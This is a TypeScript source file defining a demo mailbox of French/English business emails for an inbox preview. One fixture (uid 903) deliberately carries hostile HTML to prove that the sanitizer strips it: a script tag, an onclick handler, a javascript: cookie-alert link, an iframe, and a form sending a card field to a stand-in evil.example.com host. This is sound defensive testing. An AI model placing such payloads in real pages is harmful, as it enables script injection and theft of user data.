/**
 * demo-messages.ts — in-memory demo mailbox (SERVER-ONLY).
 *
 * Used when the real mailbox is unconfigured (fresh clone / preview), so the
 * entire inbox UI is exercisable without IMAP/SMTP credentials. Fixtures are
 * realistic Eiden Group business threads (booking confirmations, a suspected
 * double-booking, a formation enrollment CSV, invoice questions — FR/EN mix).
 *
 * One fixture (uid 903) embeds `<script>alert(1)</script>` and inline handlers
 * on purpose — rendered through sanitizeMessageHtml, a working preview proves
 * the payload is stripped before it reaches the iframe.
 *
 * Demo "mark as seen" is held in a module-level Map so the toggle works during
 * a preview session. It is intentionally non-persistent.
 */
import "server-only";
import type { MailFolder, MailAttachmentMeta, MailMessage, MailMessageSummary, MailAddress } from "./imap";
import { excerpt, MAX_QUOTE_CHARS } from "./mime";
import { sanitizeMessageHtml } from "./sanitize";

interface DemoAttachment extends MailAttachmentMeta {
  /** UTF-8 text payload served by the demo attachment endpoint */
  content: string;
}

export interface DemoMessage extends MailMessage {
  attachments: DemoAttachment[];
}

interface DemoRecord {
  uid: number;
  folder: MailFolder;
  seq: number;
  from: MailAddress;
  to: MailAddress[];
  cc: MailAddress[];
  subject: string;
  date: string;
  seen: boolean;
  size: number;
  html: string | null;
  text: string;
  messageId: string;
  inReplyTo: string | null;
  references: string[];
  attachments: DemoAttachment[];
}

const CONTACT: MailAddress = { name: "Eiden Group", address: "contact@eiden-group.com" };
const NOW = Date.now();
const hoursAgo = (h: number) => new Date(NOW - h * 3_600_000).toISOString();
const daysAgo = (d: number, h = 0) => new Date(NOW - d * 86_400_000 - h * 3_600_000).toISOString();

const CSV_ENROLLMENT = [
  "nom,prenom,email,societe,statut",
  "El Amrani,Khadija,k.elamrani@marjanemaroc.ma,Marjane,CONFIRME",
  "Tazi,Mehdi,m.tazi@attijariwafa.com,Attijariwafa Bank,CONFIRME",
  "Benali,Sara,s.benali@oncf.ma,ONCF,ATTENTE",
  "Idrissi,Omar,o.idrissi@marjane.ma,Marjane,CONFIRME",
  "Chraibi,Lina,l.chraibi@otopgroup.com,OTOP Group,CONFIRME",
  "Berrada,Yassine,y.berrada@balima.ma,Balima,LISTE_ATTENTE",
].join("\n");

const NOTES_SALLE_GRANDE = [
  "Ordre du jour — séminaire clients, mardi 10h00",
  "- Point 1 : revue du pipe Q4",
  "- Point 2 : démonstration plateforme CALENDAR.",
  "- Point 3 : lunch 13:00 (traiteur réservé)",
  "Contact: Nadia Bensaïd — nadia@acme-sarl.ma",
].join("\n");

const RECORDS: DemoRecord[] = [
  {
    uid: 901, folder: "INBOX", seq: 901,
    from: { name: "Nadia Bensaïd", address: "nadia@acme-sarl.ma" },
    to: [CONTACT], cc: [],
    subject: "Booking confirmation — Salle Grande, Tuesday 10:00",
    date: hoursAgo(2), seen: false, size: 18_432,
    messageId: "<20261113.0902.901@acme-sarl.ma>",
    inReplyTo: null, references: [],
    attachments: [
      { part: "2", filename: "ordre-du-jour-salle-grande.txt", contentType: "text/plain", size: NOTES_SALLE_GRANDE.length, content: NOTES_SALLE_GRANDE },
    ],
    text: "Bonjour,\n\nNous confirmons notre réservation de la Salle Grande pour mardi à 10:00 (12 personnes). Pourriez-vous nous confirmer le matériel : vidéoprojecteur, écran 85\" et paperboard ?\n\nMerci,\nNadia Bensaïd — Acme SARL",
    html: [
      "<p>Bonjour,</p>",
      "<p>Nous confirmons notre réservation de la <strong>Salle Grande</strong> pour mardi à 10:00 (12 personnes). Pourriez-vous nous confirmer le matériel : vidéoprojecteur, écran 85&quot; et paperboard&nbsp;?</p>",
      "<p>Merci,<br>Nadia Bensaïd — Acme SARL</p>",
    ].join(""),
  },
  {
    uid: 902, folder: "INBOX", seq: 902,
    from: { name: "Khadija El Amrani", address: "k.elamrani@marjanemaroc.ma" },
    to: [CONTACT], cc: [],
    subject: "Formation enrollment — React Avancé S3 (CSV)",
    date: hoursAgo(6), seen: false, size: 24_108,
    messageId: "<CAN=20261113-902@marjanemaroc.ma>",
    inReplyTo: null, references: [],
    attachments: [
      { part: "2", filename: "participants-react-s3.csv", contentType: "text/csv", size: CSV_ENROLLMENT.length, content: CSV_ENROLLMENT },
    ],
    text: "Bonjour,\n\nCi-joint la liste des participants pour la session React Avancé S3 du 24 novembre (16 places). Deux places restent en liste d'attente. Merci d'accuser réception.\n\nCordialement,\nKhadija El Amrani — Marjane",
    html: [
      "<p>Bonjour,</p>",
      "<p>Ci-joint la liste des participants pour la session <strong>React Avancé S3</strong> du 24 novembre (16 places). Deux places restent en liste d'attente. Merci d'accuser réception.</p>",
      "<p>Cordialement,<br>Khadija El Amrani — Marjane</p>",
    ].join(""),
  },
  {
    uid: 903, folder: "INBOX", seq: 903,
    from: { name: "Omar Idrissi", address: "o.idrissi@balima.ma" },
    to: [CONTACT], cc: [],
    subject: "Salle Grande double-booked?",
    date: hoursAgo(9), seen: false, size: 9_217,
    messageId: "<suspect-903@balima.ma>",
    inReplyTo: null, references: [],
    attachments: [],
    text: "Bonjour — nous avons une confirmation pour mardi 10:00 en Salle Grande, mais votre site affiche déjà un créneau occupé à la même heure. Pouvez-vous vérifier s'il y a un conflit ?\n\n<script>alert(1)</script> Merci !",
    // Deliberately hostile markup — must be stripped by the sanitizer.
    html: [
      "<p>Bonjour — nous avons une confirmation pour <strong>mardi 10:00 en Salle Grande</strong>, mais votre site affiche déjà un créneau occupé à la même heure. Pouvez-vous vérifier s'il y a un conflit&nbsp;?</p>",
      "<script>alert(1)</script>",
      '<p onclick="steal()">Merci !</p>',
      '<img src="https://tracker.example.com/pixel.gif" alt="" width="1" height="1">',
      '<iframe src="https://evil.example.com"></iframe>',
      '<form action="https://evil.example.com/collect"><input name="card"></form>',
      '<a href="javascript:alert(document.cookie)">Click for the conflict report</a>',
    ].join(""),
  },
  {
    uid: 904, folder: "INBOX", seq: 904,
    from: { name: "Comptabilité", address: "compta@attijariwafa.com" },
    to: [CONTACT], cc: [],
    subject: "Invoice #2026-014 — question",
    date: daysAgo(1, 3), seen: true, size: 12_640,
    messageId: "<inv-2026-014@attijariwafa.com>",
    inReplyTo: null, references: [],
    attachments: [],
    text: "Bonjour,\n\nFacture #2026-014 (mise à disposition Salle Formation, 3 jours) : le montant HT semble différer de notre bon de commande N°4471. Merci de nous confirmer le détail de la ligne « Formation — options ».\n\nCordialement,\nService comptabilité",
    html: [
      "<p>Bonjour,</p>",
      "<p>Facture <strong>#2026-014</strong> (mise à disposition Salle Formation, 3 jours) : le montant HT semble différer de notre bon de commande N°4471.</p>",
      "<p>Merci de nous confirmer le détail de la ligne «&nbsp;Formation — options&nbsp;».</p>",
      "<p>Cordialement,<br>Service comptabilité</p>",
    ].join(""),
  },
  {
    uid: 905, folder: "INBOX", seq: 905,
    from: { name: "Youssef Berrada", address: "youssef@otopgroup.com" },
    to: [CONTACT], cc: [],
    subject: "Demande de devis — séminaire annuel",
    date: daysAgo(2, 5), seen: true, size: 15_872,
    messageId: "<devis-905@otopgroup.com>",
    inReplyTo: null, references: [],
    attachments: [],
    text: "Bonjour,\n\nNous souhaitons organiser notre séminaire annuel (45 personnes, 2 jours) à Casablanca. Merci de nous envoyer un devis pour la Salle Grande + Salle Formation, avec traiteur et équipement A/V complet. Dates envisagées : semaine du 15 décembre.\n\nBien cordialement,\nYoussef Berrada — OTOP Group",
    html: [
      "<p>Bonjour,</p>",
      "<p>Nous souhaitons organiser notre <strong>séminaire annuel</strong> (45 personnes, 2 jours) à Casablanca. Merci de nous envoyer un devis pour la Salle Grande + Salle Formation, avec traiteur et équipement A/V complet.</p>",
      "<p>Dates envisagées : semaine du 15 décembre.</p>",
      "<p>Bien cordialement,<br>Youssef Berrada — OTOP Group</p>",
    ].join(""),
  },
  {
    uid: 906, folder: "Sent", seq: 906,
    from: CONTACT,
    to: [{ name: "Nadia Bensaïd", address: "nadia@acme-sarl.ma" }], cc: [],
    subject: "Re: Booking confirmation — Salle Grande, Tuesday 10:00",
    date: hoursAgo(1), seen: true, size: 11_284,
    messageId: "<20261113.1015.906@eiden-group.com>",
    inReplyTo: "<20261113.0902.901@acme-sarl.ma>",
    references: ["<20261113.0902.901@acme-sarl.ma>"],
    attachments: [],
    text: "Bonjour Nadia,\n\nBien noté — Salle Grande, mardi 10:00, 12 personnes, vidéoprojecteur + écran 85\" + paperboard confirmés. Votre ordre du jour est bien reçu.\n\nCordialement,\nEiden Group",
    html: [
      "<p>Bonjour Nadia,</p>",
      "<p>Bien noté — <strong>Salle Grande, mardi 10:00</strong>, 12 personnes, vidéoprojecteur + écran 85&quot; + paperboard confirmés. Votre ordre du jour est bien reçu.</p>",
      "<p>Cordialement,<br>Eiden Group</p>",
    ].join(""),
  },
  {
    uid: 907, folder: "Sent", seq: 907,
    from: CONTACT,
    to: [{ name: "Khadija El Amrani", address: "k.elamrani@marjanemaroc.ma" }], cc: [],
    subject: "Confirmation — Formation Leadership T4",
    date: daysAgo(1, 1), seen: true, size: 14_051,
    messageId: "<20261112.cos.907@eiden-group.com>",
    inReplyTo: null, references: [],
    attachments: [],
    text: "Bonjour Khadija,\n\nVotre inscription à la Formation Leadership T4 (5 décembre, Salle Formation, 20 places) est confirmée. Vous recevrez le programme détaillé la semaine prochaine.\n\nCordialement,\nEiden Group",
    html: [
      "<p>Bonjour Khadija,</p>",
      "<p>Votre inscription à la <strong>Formation Leadership T4</strong> (5 décembre, Salle Formation, 20 places) est confirmée. Vous recevrez le programme détaillé la semaine prochaine.</p>",
      "<p>Cordialement,<br>Eiden Group</p>",
    ].join(""),
  },
  {
    uid: 908, folder: "Sent", seq: 908,
    from: CONTACT,
    to: [{ name: "ONCF — Réception", address: "reception@oncf.ma" }], cc: [],
    subject: "Re: Invoice #2026-014 — question",
    date: daysAgo(1, 7), seen: true, size: 13_330,
    messageId: "<20261112.reo.908@eiden-group.com>",
    inReplyTo: "<inv-2026-014@attijariwafa.com>",
    references: ["<inv-2026-014@attijariwafa.com>"],
    attachments: [],
    text: "Bonjour,\n\nMerci pour votre message. Il s'agissait bien de la ligne Formation — options ; nous renvoyons une facture rectificative #2026-014-R aujourd'hui. Merci de votre compréhension.\n\nCordialement,\nEiden Group",
    html: [
      "<p>Bonjour,</p>",
      "<p>Merci pour votre message. Il s'agissait bien de la ligne <strong>Formation — options</strong> ; nous renvoyons une facture rectificative #2026-014-R aujourd'hui.</p>",
      "<p>Merci de votre compréhension.<br>Cordialement,<br>Eiden Group</p>",
    ].join(""),
  },
];

/* ------------------------------------------------------------------ */
/* Demo seen-state overlay (module-level, non-persistent)              */
/* ------------------------------------------------------------------ */

const seenOverrides = new Map<number, boolean>();

export function demoSetSeen(uid: number, seen: boolean): boolean {
  seenOverrides.set(uid, seen);
  return true;
}

function effectiveSeen(record: DemoRecord): boolean {
  return seenOverrides.get(record.uid) ?? record.seen;
}

/* ------------------------------------------------------------------ */
/* Public API                                                          */
/* ------------------------------------------------------------------ */

export function getDemoMessageList(folder: MailFolder): MailMessageSummary[] {
  return RECORDS.filter((r) => r.folder === folder)
    .map((r) => {
      const plain = r.text;
      return {
        uid: r.uid,
        seq: r.seq,
        from: r.from,
        to: r.to,
        cc: r.cc,
        subject: r.subject,
        date: r.date,
        seen: effectiveSeen(r),
        hasAttachments: r.attachments.length > 0,
        size: r.size,
        preview: excerpt(plain, 120),
      };
    })
    .sort((a, b) => b.date.localeCompare(a.date));
}

export function getDemoMessage(uid: number, folder: MailFolder): DemoMessage | null {
  const r = RECORDS.find((rec) => rec.uid === uid && rec.folder === folder);
  if (!r) return null;
  // Demo html is sanitized exactly like live mail — one code path, proof included.
  const text = r.text;
  return {
    uid: r.uid,
    seq: r.seq,
    from: r.from,
    to: r.to,
    cc: r.cc,
    subject: r.subject,
    date: r.date,
    seen: effectiveSeen(r),
    hasAttachments: r.attachments.length > 0,
    size: r.size,
    preview: excerpt(text, 120),
    html: r.html ? sanitizeMessageHtml(r.html) : null,
    text,
    messageId: r.messageId,
    inReplyTo: r.inReplyTo,
    references: r.references,
    attachments: r.attachments,
    textPlainExcerpt: excerpt(text, MAX_QUOTE_CHARS),
  };
}

/** Lookup used by the demo attachment endpoint. */
export function getDemoAttachment(
  uid: number,
  folder: MailFolder,
  part: string,
): DemoAttachment | null {
  const r = RECORDS.find((rec) => rec.uid === uid && rec.folder === folder);
  return r?.attachments.find((a) => a.part === part) ?? null;
}

/** Server-side demo reply: pretend the send worked, return a stable-ish id. */
export function getDemoReplyReceipt(uid: number): string {
  return `<demo-reply-${uid}-${Date.now().toString(36)}@eiden-group.com>`;
}
